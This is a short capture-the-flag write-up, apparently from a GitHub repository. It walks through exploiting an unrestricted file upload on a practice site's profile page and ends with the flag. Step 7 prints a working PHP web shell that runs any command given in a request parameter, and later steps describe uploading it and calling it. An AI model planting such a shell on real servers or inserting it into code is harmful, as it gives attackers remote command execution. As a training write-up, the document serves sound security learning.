My first ctf report which has Arbitary File Upload Vulnerability.
1. Firstly, I visited the login page(login.html) 
2. Registered myself and then logged in.
3. Then, I tried to look into the page source but nothing came out to be useful for me.
4. After looking into every other pages , I found the upload feature in profile.html
<img src="https://github.com/AmanDekate1/SecurityBoat-2024-CTF-January-Challenge/blob/main/upload.png">
5. Then i looked for the arbitary file upload feature.
6. First I uploaded a sample image, and checked its location on server using inspect element.
<img src="https://github.com/AmanDekate1/SecurityBoat-2024-CTF-January-Challenge/blob/main/inspect.png">
7. It was time for a script..
  <?php 
  if(isset($_REQUEST['cmd'])){
      $cmd = ($_REQUEST['cmd']);
      system($cmd);
  }?>

8.  if we go to the non valid directory we can see the error is exposing that it is a Apache server and Apache server mostly uses php files.  <---Why I used php
<img src="https://github.com/AmanDekate1/SecurityBoat-2024-CTF-January-Challenge/blob/main/whyphp.png">
9. Uploading my script. After a message "File Uploaded Successfully!" all I need to do is go to the uploaded image directory (assets/profPic/shelly.php) to make my script working.
10. We got the command execution!
<img src="https://github.com/AmanDekate1/SecurityBoat-2024-CTF-January-Challenge/blob/main/works.png">
<img src="https://github.com/AmanDekate1/SecurityBoat-2024-CTF-January-Challenge/blob/main/flag.png">
11. {Unrestr!cted_F!le_Upload_!s_Fun} 
